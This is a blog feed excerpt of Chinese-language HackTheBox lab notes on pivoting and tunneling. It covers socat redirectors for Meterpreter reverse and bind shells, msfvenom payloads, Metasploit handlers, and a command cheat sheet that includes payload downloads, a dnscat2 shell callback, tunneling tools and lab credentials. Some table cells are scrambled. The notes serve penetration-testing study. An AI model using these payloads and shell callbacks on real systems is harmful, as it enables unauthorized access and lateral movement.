    <content type="html"><![CDATA[<h1 id="Socat-Redirection-with-a-Reverse-Shell"><a href="#Socat-Redirection-with-a-Reverse-Shell" class="headerlink" title="Socat Redirection with a Reverse Shell"></a>Socat Redirection with a Reverse Shell</h1><p><a href="https://linux.die.net/man/1/socat">Socat</a>是一个双向中继工具，可以在2个独立的网络通道之间创建管道套接字，而无需使用SSH隧道。它充当了一个重定向器，可以监听一个主机和端口，并将数据转发到另一个IP地址和端口。我们可以使用上一节中提到的攻击主机上的相同命令启动Metasploit的侦听器，我们也可以在Ubuntu服务器上启动socat。</p><h4 id="Starting-Socat-Listener"><a href="#Starting-Socat-Listener" class="headerlink" title="Starting Socat Listener"></a>Starting Socat Listener</h4><pre><code class="shell-session">ubuntu@Webserver:~$ socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80</code></pre><p>Socat将在8080端口的localhost上侦听，并将所有流量转发到我们的攻击主机（10.10.14.18）上的80端口。一旦配置了我们的重定向器，我们就可以创建一个有效负载，该负载将连接回在Ubuntu服务器上运行的重定向器。我们还将在攻击主机上启动一个侦听器，因为一旦socat接收到来自目标的连接，它就会将所有流量重定向到攻击主机的侦听器，在那里我们将获得一个shell。</p><h4 id="Creating-the-Windows-Payload"><a href="#Creating-the-Windows-Payload" class="headerlink" title="Creating the Windows Payload"></a>Creating the Windows Payload</h4><pre><code class="shell-session">Tanin@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=8080</code></pre><h4 id="Configuring-amp-Starting-the-multi-x2F-handler"><a href="#Configuring-amp-Starting-the-multi-x2F-handler" class="headerlink" title="Configuring &amp; Starting the multi&#x2F;handler"></a>Configuring &amp; Starting the multi&#x2F;handler</h4><pre><code class="shell-session">msf6 &gt; use exploit/multi/handler[*] Using configured payload generic/shell_reverse_tcpmsf6 exploit(multi/handler) &gt; set payload windows/x64/meterpreter/reverse_httpspayload =&gt; windows/x64/meterpreter/reverse_httpsmsf6 exploit(multi/handler) &gt; set lhost 0.0.0.0lhost =&gt; 0.0.0.0msf6 exploit(multi/handler) &gt; set lport 80lport =&gt; 80msf6 exploit(multi/handler) &gt; run</code></pre><h1 id="Socat-Redirection-with-a-Bind-Shell"><a href="#Socat-Redirection-with-a-Bind-Shell" class="headerlink" title="Socat Redirection with a Bind Shell"></a>Socat Redirection with a Bind Shell</h1><p>类似于我们的socat的反向shell重定向器，我们也可以创建一个socat绑定shell重定向器。这与从Windows服务器连接回Ubuntu服务器并重定向到我们的攻击主机的反向shell不同。在绑定shell的情况下，Windows服务器将启动一个侦听器并绑定到一个特定的端口。我们可以为Windows创建一个绑定shell负载，并在Windows主机上执行它。同时，我们可以在Ubuntu服务器上创建一个socat重定向器，它将侦听来自Metasploit绑定处理程序的传入连接，并将其转发到Windows目标上的绑定shell负载。下图应该可以更好地解释枢轴。</p><p><img src="https://academy.hackthebox.com/storage/modules/158/55.png" alt="img"></p><p>我们可以通过以下命令使用msfvenom创建绑定shell。</p><pre><code class="shell-session">Tanin@htb[/htb]$ msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupscript.exe LPORT=8443[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload[-] No arch selected, selecting arch: x64 from the payloadNo encoder specified, outputting raw payloadPayload size: 499 bytesFinal size of exe file: 7168 bytesSaved as: backupjob.exe</code></pre><p>我们可以启动一个socat绑定shell侦听器，它在端口8080上侦听并将数据包转发到Windows服务器8443。</p><pre><code class="shell-session">ubuntu@Webserver:~$ socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443</code></pre><p>最后，我们可以启动一个Metasploit绑定处理程序。这个绑定处理程序可以配置为连接到端口8080（Ubuntu服务器）上的socat侦听器</p><pre><code class="shell-session">msf6 &gt; use exploit/multi/handler[*] Using configured payload generic/shell_reverse_tcpmsf6 exploit(multi/handler) &gt; set payload windows/x64/meterpreter/bind_tcppayload =&gt; windows/x64/meterpreter/bind_tcpmsf6 exploit(multi/handler) &gt; set RHOST 10.129.202.64RHOST =&gt; 10.129.202.64msf6 exploit(multi/handler) &gt; set LPORT 8080LPORT =&gt; 8080msf6 exploit(multi/handler) &gt; run[*] Started bind TCP handler against 10.129.202.64:8080</code></pre><p>我们可以看到，在Windows目标上执行有效负载时，绑定处理程序通过socat侦听器连接到阶段请求。</p><pre><code class="shell-session">[*] Sending stage (200262 bytes) to 10.129.202.64[*] Meterpreter session 1 opened (10.10.14.18:46253 -&gt; 10.129.202.64:8080 ) at 2022-03-07 12:44:44 -0500meterpreter &gt; getuidServer username: INLANEFREIGHT\victor</code></pre><h1 id="socat基本用法："><a href="#socat基本用法：" class="headerlink" title="socat基本用法："></a>socat基本用法：</h1><p><code>socat</code> 是一个非常灵活的工具，可以用于许多不同的用途。以下是一些常见的 <code>socat</code> 命令示例，演示了一些常见的用法：</p><ol><li><p><strong>创建端口转发：</strong></p><pre><code>socat TCP-LISTEN:8080,fork TCP:目标IP:80</code></pre><p>在本地监听端口 8080，并将流量转发到目标 IP 地址的 80 端口。</p></li><li><p><strong>创建代理服务器：</strong></p><pre><code>socat TCP-LISTEN:8888,fork TCP:目标IP:80</code></pre><p>在本地监听端口 8888，将流量作为代理转发到目标 IP 地址的 80 端口。</p></li><li><p><strong>加密连接：</strong></p><pre><code>socat OPENSSL-LISTEN:443,cert=server.pem,verify=0,fork OPENSSL:目标IP:8443</code></pre><p>在本地监听端口 443，使用 SSL 加密，将数据转发到目标 IP 地址的 8443 端口。</p></li><li><p><strong>创建虚拟串口：</strong></p><pre><code>socat PTY,link=/dev/ttyS0 PTY,link=/dev/ttyS1</code></pre><p>创建两个虚拟串口设备 <code>/dev/ttyS0</code> 和 <code>/dev/ttyS1</code>，将数据从一个串口转发到另一个串口。</p></li><li><p><strong>文件传输：</strong></p><pre><code>socat FILE:source.txt TCP-LISTEN:8080</code></pre><p>将文件 <code>source.txt</code> 的内容通过 TCP 在本地监听端口 8080 上传输。</p></li><li><p><strong>执行 Shell 命令：</strong></p><pre><code>socat SYSTEM:&#39;ls -l&#39;,pty,stderr TCP-LISTEN:8080</code></pre><p>在本地监听端口 8080，执行 <code>ls -l</code> 命令并将输出传输到连接。</p></li></ol><p>这些示例只是 <code>socat</code> 的一小部分用法，它有很多其他功能和选项，可以根据不同的需求进行调整。在使用 <code>socat</code> 时，应该查阅官方文档以了解更多详细信息和用法示例。</p><h1 id="本节备忘录："><a href="#本节备忘录：" class="headerlink" title="本节备忘录："></a>本节备忘录：</h1><table><thead><tr><th>Command</th><th>Description</th></tr></thead><tbody><tr><td><code>ifconfig</code></td><td>Linux-based command that displays all current network configurations of a system.</td></tr><tr><td><code>ipconfig</code></td><td>Windows-based command that displays all system network configurations.</td></tr><tr><td><code>netstat -r</code></td><td>Command used to display the routing table for all IPv4-based protocols.</td></tr><tr><td><code>nmap -sT -p22,3306 &lt;IPaddressofTarget&gt;</code></td><td>Nmap command used to scan a target for open ports allowing SSH or MySQL connections.</td></tr><tr><td><code>ssh -L 1234:localhost:3306 Ubuntu@&lt;IPaddressofTarget&gt;</code></td><td>SSH comand used to create an SSH tunnel from a local machine on local port <code>1234</code> to a remote target using port 3306.</td></tr><tr><td>&#96;netstat -antp</td><td>grep 1234&#96;</td></tr><tr><td><code>nmap -v -sV -p1234 localhost</code></td><td>Nmap command used to scan a host through a connection that has been made on local port <code>1234</code>.</td></tr><tr><td><code>ssh -L 1234:localhost:3306 8080:localhost:80 ubuntu@&lt;IPaddressofTarget&gt;</code></td><td>SSH command that instructs the ssh client to request the SSH server forward all data via port <code>1234</code> to <code>localhost:3306</code>.</td></tr><tr><td><code>ssh -D 9050 ubuntu@&lt;IPaddressofTarget&gt;</code></td><td>SSH command used to perform a dynamic port forward on port <code>9050</code> and establishes an SSH tunnel with the target. This is part of setting up a SOCKS proxy.</td></tr><tr><td><code>tail -4 /etc/proxychains.conf</code></td><td>Linux-based command used to display the last 4 lines of &#x2F;etc&#x2F;proxychains.conf. Can be used to ensure socks configurations are in place.</td></tr><tr><td><code>proxychains nmap -v -sn 172.16.5.1-200</code></td><td>Used to send traffic generated by an Nmap scan through Proxychains and a SOCKS proxy. Scan is performed against the hosts in the specified range <code>172.16.5.1-200</code> with increased verbosity (<code>-v</code>) disabling ping scan (<code>-sn</code>).</td></tr><tr><td><code>proxychains nmap -v -Pn -sT 172.16.5.19</code></td><td>Used to send traffic generated by an Nmap scan through Proxychains and a SOCKS proxy. Scan is performed against 172.16.5.19 with increased verbosity (<code>-v</code>), disabling ping discover (<code>-Pn</code>), and using TCP connect scan type (<code>-sT</code>).</td></tr><tr><td><code>proxychains msfconsole</code></td><td>Uses Proxychains to open Metasploit and send all generated network traffic through a SOCKS proxy.</td></tr><tr><td><code>msf6 &gt; search rdp_scanner</code></td><td>Metasploit search that attempts to find a module called <code>rdp_scanner</code>.</td></tr><tr><td><code>proxychains xfreerdp /v:&lt;IPaddressofTarget&gt; /u:victor /p:pass@123</code></td><td>Used to connect to a target using RDP and a set of credentials using proxychains. This will send all traffic through a SOCKS proxy.</td></tr><tr><td><code>msfvenom -p windows/x64/meterpreter/reverse_https lhost= &lt;InteralIPofPivotHost&gt; -f exe -o backupscript.exe LPORT=8080</code></td><td>Uses msfvenom to generate a Windows-based reverse HTTPS Meterpreter payload that will send a call back to the IP address specified following <code>lhost=</code> on local port 8080 (<code>LPORT=8080</code>). Payload will take the form of an executable file called <code>backupscript.exe</code>.</td></tr><tr><td><code>msf6 &gt; use exploit/multi/handler</code></td><td>Used to select the multi-handler exploit module in Metasploit.</td></tr><tr><td><code>scp backupscript.exe ubuntu@&lt;ipAddressofTarget&gt;:~/</code></td><td>Uses secure copy protocol (<code>scp</code>) to transfer the file <code>backupscript.exe</code> to the specified host and places it in the Ubuntu user’s home directory (<code>:~/</code>).</td></tr><tr><td><code>python3 -m http.server 8123</code></td><td>Uses Python3 to start a simple HTTP server listening on port<code> 8123</code>. Can be used to retrieve files from a host.</td></tr><tr><td><code>Invoke-WebRequest -Uri &quot;http://172.16.5.129:8123/backupscript.exe&quot; -OutFile &quot;C:\backupscript.exe&quot;</code></td><td>PowerShell command used to download a file called backupscript.exe from a webserver (<code>172.16.5.129:8123</code>) and then save the file to location specified after <code>-OutFile</code>.</td></tr><tr><td><code>ssh -R &lt;InternalIPofPivotHost&gt;:8080:0.0.0.0:80 ubuntu@&lt;ipAddressofTarget&gt; -vN</code></td><td>SSH command used to create a reverse SSH tunnel from a target to an attack host. Traffic is forwarded on port <code>8080</code> on the attack host to port <code>80</code> on the target.</td></tr><tr><td><code>msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=&lt;IPaddressofAttackHost -f elf -o backupjob LPORT=8080</code></td><td>Uses msfveom to generate a Linux-based Meterpreter reverse TCP payload that calls back to the IP specified after <code>LHOST=</code> on port 8080 (<code>LPORT=8080</code>). Payload takes the form of an executable elf file called backupjob.</td></tr><tr><td><code>msf6&gt; run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23</code></td><td>Metasploit command that runs a ping sweep module against the specified network segment (<code>RHOSTS=172.16.5.0/23</code>).</td></tr><tr><td></td><td></td></tr><tr><td>&#96;for i in {1..254} ;do (ping -c 1 172.16.5.$i</td><td>grep “bytes from” &amp;) ;done&#96;</td></tr><tr><td>&#96;for &#x2F;L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100</td><td>find “Reply”&#96;</td></tr><tr><td>&#96;1..254</td><td>% {“172.16.5.$($<em>): $(Test-Connection -count 1 -comp 172.15.5.$($</em>) -quiet)”}&#96;</td></tr><tr><td><code>msf6 &gt; use auxiliary/server/socks_proxy</code></td><td>Metasploit command that selects the <code>socks_proxy</code> auxiliary module.</td></tr><tr><td><code>msf6 auxiliary(server/socks_proxy) &gt; jobs</code></td><td>Metasploit command that lists all currently running jobs.</td></tr><tr><td><code>socks4 127.0.0.1 9050</code></td><td>Line of text that should be added to &#x2F;etc&#x2F;proxychains.conf to ensure a SOCKS version 4 proxy is used in combination with proxychains on the specified IP address and port.</td></tr><tr><td><code>Socks5 127.0.0.1 1080</code></td><td>Line of text that should be added to &#x2F;etc&#x2F;proxychains.conf to ensure a SOCKS version 5 proxy is used in combination with proxychains on the specified IP address and port.</td></tr><tr><td><code>msf6 &gt; use post/multi/manage/autoroute</code></td><td>Metasploit command used to select the autoroute module.</td></tr><tr><td></td><td></td></tr><tr><td><code>meterpreter &gt; help portfwd</code></td><td>xxxxxxxxxx11 1[<em>] Started reverse TCP handler on 0.0.0.0:8081 2[</em>] Sending stage (200262 bytes) to 10.10.14.183[*] Meterpreter session 2 opened (10.10.14.18:8081 -&gt; 10.10.14.18:40173 ) at 2022-03-04 15:26:14 -05004​5meterpreter &gt; shell6Process 2336 created.7Channel 1 created.8Microsoft Windows [Version 10.0.17763.1637]9(c) 2018 Microsoft Corporation. All rights reserved.10​11C:&gt;shell-session</td></tr><tr><td><code>meterpreter &gt; portfwd add -l 3300 -p 3389 -r &lt;IPaddressofTarget&gt;</code></td><td>Meterpreter-based portfwd command that adds a forwarding rule to the current Meterpreter session. This rule forwards network traffic on port 3300 on the local machine to port 3389 (RDP) on the target.</td></tr><tr><td><code>xfreerdp /v:localhost:3300 /u:victor /p:pass@123</code></td><td>Uses xfreerdp to connect to a remote host through localhost:3300 using a set of credentials. Port forwarding rules must be in place for this to work properly.</td></tr><tr><td><code>netstat -antp</code></td><td>Used to display all (<code>-a</code>) active network connections with associated process IDs. <code>-t</code> displays only TCP connections.<code>-n</code> displays only numerical addresses. <code>-p</code> displays process IDs associated with each displayed connection.</td></tr><tr><td><code>meterpreter &gt; portfwd add -R -l 8081 -p 1234 -L &lt;IPaddressofAttackHost&gt;</code></td><td>Meterpreter-based portfwd command that adds a forwarding rule that directs traffic coming on on port 8081 to the port <code>1234</code> listening on the IP address of the Attack Host.</td></tr><tr><td><code>meterpreter &gt; bg</code></td><td>Meterpreter-based command used to run the selected metepreter session in the background. Similar to background a process in Linux</td></tr><tr><td><code>socat TCP4-LISTEN:8080,fork TCP4:&lt;IPaddressofAttackHost&gt;:80</code></td><td>Uses Socat to listen on port 8080 and then to fork when the connection is received. It will then connect to the attack host on port 80.</td></tr><tr><td><code>socat TCP4-LISTEN:8080,fork TCP4:&lt;IPaddressofTarget&gt;:8443</code></td><td>Uses Socat to listen on port 8080 and then to fork when the connection is received. Then it will connect to the target host on port 8443.</td></tr><tr><td><code>plink -D 9050 ubuntu@&lt;IPaddressofTarget&gt;</code></td><td>Windows-based command that uses PuTTY’s Plink.exe to perform SSH dynamic port forwarding and establishes an SSH tunnel with the specified target. This will allow for proxy chaining on a Windows host, similar to what is done with Proxychains on a Linux-based host.</td></tr><tr><td><code>sudo apt-get install sshuttle</code></td><td>Uses apt-get to install the tool sshuttle.</td></tr><tr><td><code>sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0 -v</code></td><td>Runs sshuttle, connects to the target host, and creates a route to the 172.16.5.0 network so traffic can pass from the attack host to hosts on the internal network (<code>172.16.5.0</code>).</td></tr><tr><td><code>sudo git clone https://github.com/klsecservices/rpivot.git</code></td><td>Clones the rpivot project GitHub repository.</td></tr><tr><td><code>sudo apt-get install python2.7</code></td><td>Uses apt-get to install python2.7.</td></tr><tr><td><code>python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0</code></td><td>Used to run the rpivot server (<code>server.py</code>) on proxy port <code>9050</code>, server port <code>9999</code> and listening on any IP address (<code>0.0.0.0</code>).</td></tr><tr><td><code>scp -r rpivot ubuntu@&lt;IPaddressOfTarget&gt;</code></td><td>Uses secure copy protocol to transfer an entire directory and all of its contents to a specified target.</td></tr><tr><td><code>python2.7 client.py --server-ip 10.10.14.18 --server-port 9999</code></td><td>Used to run the rpivot client (<code>client.py</code>) to connect to the specified rpivot server on the appropriate port.</td></tr><tr><td><code>proxychains firefox-esr &lt;IPaddressofTargetWebServer&gt;:80</code></td><td>Opens firefox with Proxychains and sends the web request through a SOCKS proxy server to the specified destination web server.</td></tr><tr><td><code>python client.py --server-ip &lt;IPaddressofTargetWebServer&gt; --server-port 8080 --ntlm-proxy-ip IPaddressofProxy&gt; --ntlm-proxy-port 8081 --domain &lt;nameofWindowsDomain&gt; --username &lt;username&gt; --password &lt;password&gt;</code></td><td>Use to run the rpivot client to connect to a web server that is using HTTP-Proxy with NTLM authentication.</td></tr><tr><td><code>netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.42.198 connectport=3389 connectaddress=172.16.5.25</code></td><td>Windows-based command that uses <code>netsh.exe</code> to configure a portproxy rule called <code>v4tov4</code> that listens on port 8080 and forwards connections to the destination 172.16.5.25 on port 3389.</td></tr><tr><td><code>netsh.exe interface portproxy show v4tov4</code></td><td>Windows-based command used to view the configurations of a portproxy rule called v4tov4.</td></tr><tr><td><code>git clone https://github.com/iagox86/dnscat2.git</code></td><td>Clones the <code>dnscat2</code> project GitHub repository.</td></tr><tr><td><code>sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache</code></td><td>Used to start the dnscat2.rb server running on the specified IP address, port (<code>53</code>) &amp; using the domain <code>inlanefreight.local</code> with the no-cache option enabled.</td></tr><tr><td><code>git clone https://github.com/lukebaggett/dnscat2-powershell.git</code></td><td>Clones the dnscat2-powershell project Github repository.</td></tr><tr><td><code>Import-Module dnscat2.ps1</code></td><td>PowerShell command used to import the dnscat2.ps1 tool.</td></tr><tr><td><code>Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd</code></td><td>PowerShell command used to connect to a specified dnscat2 server using a IP address, domain name and preshared secret. The client will send back a shell connection to the server (<code>-Exec cmd</code>).</td></tr><tr><td><code>dnscat2&gt; ?</code></td><td>Used to list dnscat2 options.</td></tr><tr><td><code>dnscat2&gt; window -i 1</code></td><td>Used to interact with an established dnscat2 session.</td></tr><tr><td><code>./chisel server -v -p 1234 --socks5</code></td><td>Used to start a chisel server in verbose mode listening on port <code>1234</code> using SOCKS version 5.</td></tr><tr><td><code>./chisel client -v 10.129.202.64:1234 socks</code></td><td>Used to connect to a chisel server at the specified IP address &amp; port using socks.</td></tr><tr><td><code>git clone https://github.com/utoni/ptunnel-ng.git</code></td><td>Clones the ptunnel-ng project GitHub repository.</td></tr><tr><td><code>sudo ./autogen.sh</code></td><td>Used to run the autogen.sh shell script that will build the necessary ptunnel-ng files.</td></tr><tr><td><code>sudo ./ptunnel-ng -r10.129.202.64 -R22</code></td><td>Used to start the ptunnel-ng server on the specified IP address (<code>-r</code>) and corresponding port (<code>-R22</code>).</td></tr><tr><td><code>sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22</code></td><td>Used to connect to a specified ptunnel-ng server through local port 2222 (<code>-l2222</code>).</td></tr><tr><td><code>ssh -p2222 -lubuntu 127.0.0.1</code></td><td>SSH command used to connect to an SSH server through a local port. This can be used to tunnel SSH traffic through an ICMP tunnel.</td></tr><tr><td><code>regsvr32.exe SocksOverRDP-Plugin.dll</code></td><td>Windows-based command used to register the SocksOverRDP-PLugin.dll.</td></tr><tr><td>&#96;netstat -antb</td><td>findstr 1080&#96;</td></tr></tbody></table>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Socat-Redirection-with-a-Reverse-Shell&quot;&gt;&lt;a href=&quot;#Socat-Redirection-with-a-Reverse-Shell&quot; class=&quot;headerlink&quot; title=&quot;Socat Redirectio</summary>
      
    
    
    
    
    <category term="base" scheme="https://taninluv.github.io/tags/base/"/>
    
  </entry>
  
  <entry>
    <title>Pivoting, Tunneling, and Port Forwarding-Choosing The Dig Site &amp; Starting Our Tunnels</title>
    <link href="https://taninluv.github.io/2023/08/27/Pivoting-Tunneling-and-Port-Forwarding/"/>
    <id>https://taninluv.github.io/2023/08/27/Pivoting-Tunneling-and-Port-Forwarding/</id>
    <published>2023-08-27T08:25:27.000Z</published>
    <updated>2023-08-29T11:48:29.362Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Introduction-to-Pivoting-Tunneling-and-Port-Forwarding"><a href="#Introduction-to-Pivoting-Tunneling-and-Port-Forwarding" class="headerlink" title="Introduction to Pivoting, Tunneling, and Port Forwarding"></a>Introduction to Pivoting, Tunneling, and Port Forwarding</h1><p><img src="https://academy.hackthebox.com/storage/modules/158/PivotingandTunnelingVisualized.gif" alt="img"></p><p>在红队参与、渗透测试或Active Directory评估期间，我们经常会发现自己可能已经泄露了移动到另一台主机所需的凭据、ssh密钥、哈希或访问令牌，但可能没有其他主机可以从我们的攻击主机直接访问。在这种情况下，我们可能需要使用一个我们已经妥协的枢轴主机来找到通往下一个目标的方法。第一次登录主机时，最重要的事情之一是检查我们的权限级别、网络连接以及潜在的VPN或其他远程访问软件。如果一台主机有多个网络适配器，我们可能会使用它来移动到不同的网段。Pivoting本质上是指通过受损的主机转移到其他网络，在不同的网段上找到更多目标。</p><span id="more"></span><p>有许多不同的术语用于描述受损主机，我们可以使用这些术语来转向以前无法访问的网段。最常见的有：</p><ul><li><code>Pivot Host</code></li><li><code>Proxy</code></li><li><code>Foothold</code></li><li><code>Beach Head system</code></li><li><code>Jump Host</code></li></ul><p>Pivoting的主要用途是击败分段（物理和虚拟）来访问孤立的网络。另一方面，隧道是枢转的一个子集。隧道将网络流量封装到另一个协议中，并通过它路由流量。</p><p>像VPN或专用浏览器这样的典型应用程序只是隧道网络流量的另一种形式。 在IT和Infosec行业，我们不可避免地会遇到几个不同的术语来描述同一件事。通过旋转，我们会注意到这通常被称为横向运动。</p><h2 id="Lateral-Movement-Pivoting-and-Tunneling-Compared"><a href="#Lateral-Movement-Pivoting-and-Tunneling-Compared" class="headerlink" title="Lateral Movement, Pivoting, and Tunneling Compared"></a>Lateral Movement, Pivoting, and Tunneling Compared</h2><h4 id="Lateral-Movement"><a href="#Lateral-Movement" class="headerlink" title="Lateral Movement"></a>Lateral Movement</h4><p>横向移动可以被描述为一种用于在网络环境中进一步访问额外主机、应用程序和服务的技术。横向移动还可以帮助我们获得提升特权所需的特定领域资源。横向移动通常允许主机之间的权限升级。除了我们对这一概念的解释外，我们还可以研究其他受人尊敬的组织如何解释横向运动。如果时间允许，请查看以下两种解释：</p><p><a href="https://www.paloaltonetworks.com/cyberpedia/what-is-lateral-movement">Palo Alto Network’s Explanation</a></p><p><a href="https://attack.mitre.org/tactics/TA0008/">MITRE’s Explanation</a></p><h4 id="Pivoting"><a href="#Pivoting" class="headerlink" title="Pivoting"></a>Pivoting</h4><p>利用多个主机来跨越通常无法访问的网络边界。这是一个更有针对性的目标。这里的目标是通过损害目标主机或基础设施，使我们能够深入网络。</p><h4 id="Tunneling"><a href="#Tunneling" class="headerlink" title="Tunneling"></a>Tunneling</h4><p>我们经常发现自己使用各种协议来将流量穿梭于有可能检测到流量的网络中。例如，使用HTTP来屏蔽从我们拥有的服务器到受害者主机的命令和控制流量。这里的关键是混淆我们的行动，以尽可能长时间地避免被发现。我们使用具有增强安全措施的协议，如TLS上的HTTPS或其他传输协议上的SSH。这些类型的操作还可以实现诸如将数据从目标网络中过滤出来或将更多有效载荷和指令传递到网络中之类的策略。</p><h1 id="The-Networking-Behind-Pivoting"><a href="#The-Networking-Behind-Pivoting" class="headerlink" title="The Networking Behind Pivoting"></a>The Networking Behind Pivoting</h1><h2 id="IP-Addressing-amp-NICs"><a href="#IP-Addressing-amp-NICs" class="headerlink" title="IP Addressing &amp; NICs"></a>IP Addressing &amp; NICs</h2><h2 id="Routing"><a href="#Routing" class="headerlink" title="Routing"></a>Routing</h2><p>路由器的一个关键定义特征是它有一个路由表，用于根据目的地IP地址转发流量。我们在Pwnbox上使用命令netstat-r或ip route来查看这一点。</p><p>被指定为路由器的独立设备通常会使用静态路由创建、动态路由协议和直接连接接口的组合来学习路由。任何去往路由表中不存在的网络的流量都将被发送到默认路由，该路由也可以被称为默认网关或最后的网关。在寻找转向机会时，查看主机的路由表以确定我们可能能够到达的网络或我们可能需要添加的路由可能会很有帮助。</p><h2 id="Protocols-Services-amp-Ports"><a href="#Protocols-Services-amp-Ports" class="headerlink" title="Protocols, Services &amp; Ports"></a>Protocols, Services &amp; Ports</h2><p>可以尝试使用网络绘图工具绘制网络拓扑。当我寻找转向的机会时，我喜欢使用<a href="https://draw.io/">Draw.io</a>等工具来构建我所处网络环境的可视化，它也是一个很好的文档工具</p><h1 id="Dynamic-Port-Forwarding-with-SSH-and-SOCKS-Tunneling"><a href="#Dynamic-Port-Forwarding-with-SSH-and-SOCKS-Tunneling" class="headerlink" title="Dynamic Port Forwarding with SSH and SOCKS Tunneling"></a>Dynamic Port Forwarding with SSH and SOCKS Tunneling</h1><hr><h2 id="Port-Forwarding-in-Context"><a href="#Port-Forwarding-in-Context" class="headerlink" title="Port Forwarding in Context"></a>Port Forwarding in Context</h2><p>端口转发是一种允许我们将通信请求从一个端口重定向到另一个端口的技术。端口转发使用TCP作为主要通信层，为转发的端口提供交互式通信。然而，可以使用不同的应用层协议，如SSH甚至SOCKS（非应用层）来封装转发的流量。这可以有效绕过防火墙，并使用受损主机上的现有服务转向其他网络。</p><h2 id="SSH-Local-Port-Forwarding"><a href="#SSH-Local-Port-Forwarding" class="headerlink" title="SSH Local Port Forwarding"></a>SSH Local Port Forwarding</h2><p>让我们从下图中举一个例子。</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308291121798.png" alt="img"></p><p>我们有一个攻击主机（10.10.15.x）和一个目标Ubuntu服务器（10.129.x.x），我们已经破坏了它。我们将使用Nmap扫描目标Ubuntu服务器以搜索打开的端口。</p><h4 id="Scanning-the-Pivot-Target"><a href="#Scanning-the-Pivot-Target" class="headerlink" title="Scanning the Pivot Target"></a>Scanning the Pivot Target</h4><pre><code class="shell-session">Tanin@htb[/htb]$ nmap -sT -p22,3306 10.129.202.64Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-24 12:12 ESTNmap scan report for 10.129.202.64Host is up (0.12s latency).PORT     STATE  SERVICE22/tcp   open   ssh3306/tcp closed mysqlNmap done: 1 IP address (1 host up) scanned in 0.68 seconds</code></pre><p>Nmap输出显示SSH端口已打开。要访问MySQL服务，我们可以通过SSH连接到服务器并从Ubuntu服务器内部访问MySQL，也可以通过端口1234将其转发到本地主机并在本地访问。在本地访问它的一个好处是，如果我们想在MySQL服务上执行远程攻击，如果没有端口转发，我们将无法做到这一点。这是由于MySQL在端口3306的Ubuntu服务器上本地托管。因此，我们将使用以下命令通过SSH将本地端口（1234）转发到Ubuntu服务器。</p><h4 id="Executing-the-Local-Port-Forward"><a href="#Executing-the-Local-Port-Forward" class="headerlink" title="Executing the Local Port Forward"></a>Executing the Local Port Forward</h4><pre><code class="shell-session">Tanin@htb[/htb]$ netstat -antp | grep 1234</code></pre><h4 id="Confirming-Port-Forward-with-Nmap"><a href="#Confirming-Port-Forward-with-Nmap" class="headerlink" title="Confirming Port Forward with Nmap"></a>Confirming Port Forward with Nmap</h4><pre><code class="shell-session">Tanin@htb[/htb]$ nmap -v -sV -p1234 localhost</code></pre><p>类似地，如果我们想将多个端口从Ubuntu服务器转发到本地主机，可以通过在ssh命令中包含localport:server:port参数来实现。例如，下面的命令将apache web服务器的端口80转发到8080上的攻击主机的本地端口。</p><h4 id="Forwarding-Multiple-Ports"><a href="#Forwarding-Multiple-Ports" class="headerlink" title="Forwarding Multiple Ports"></a>Forwarding Multiple Ports</h4><pre><code class="shell-session">Tanin@htb[/htb]$ ssh -L 1234:localhost:3306 8080:localhost:80 ubuntu@10.129.202.64</code></pre><h2 id="Setting-up-to-Pivot"><a href="#Setting-up-to-Pivot" class="headerlink" title="Setting up to Pivot"></a>Setting up to Pivot</h2><p>现在，如果你在Ubuntu主机上键入ifconfig，你会发现这台服务器有多个NIC： 一个连接到我们的攻击主机（ens192） 一个与不同网络内的其他主机通信（ens224） 环回接口（lo）。</p><h4 id="Looking-for-Opportunities-to-Pivot-using-ifconfig"><a href="#Looking-for-Opportunities-to-Pivot-using-ifconfig" class="headerlink" title="Looking for Opportunities to Pivot using ifconfig"></a>Looking for Opportunities to Pivot using ifconfig</h4><pre><code class="shell-session">ubuntu@WEB01:~$ ifconfig ens192: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500        inet 10.129.202.64  netmask 255.255.0.0  broadcast 10.129.255.255        inet6 dead:beef::250:56ff:feb9:52eb  prefixlen 64  scopeid 0x0&lt;global&gt;        inet6 fe80::250:56ff:feb9:52eb  prefixlen 64  scopeid 0x20&lt;link&gt;        ether 00:50:56:b9:52:eb  txqueuelen 1000  (Ethernet)        RX packets 35571  bytes 177919049 (177.9 MB)        RX errors 0  dropped 0  overruns 0  frame 0        TX packets 10452  bytes 1474767 (1.4 MB)        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0ens224: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500        inet 172.16.5.129  netmask 255.255.254.0  broadcast 172.16.5.255        inet6 fe80::250:56ff:feb9:a9aa  prefixlen 64  scopeid 0x20&lt;link&gt;        ether 00:50:56:b9:a9:aa  txqueuelen 1000  (Ethernet)        RX packets 8251  bytes 1125190 (1.1 MB)        RX errors 0  dropped 40  overruns 0  frame 0        TX packets 1538  bytes 123584 (123.5 KB)        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536        inet 127.0.0.1  netmask 255.0.0.0        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;        loop  txqueuelen 1000  (Local Loopback)        RX packets 270  bytes 22432 (22.4 KB)        RX errors 0  dropped 0  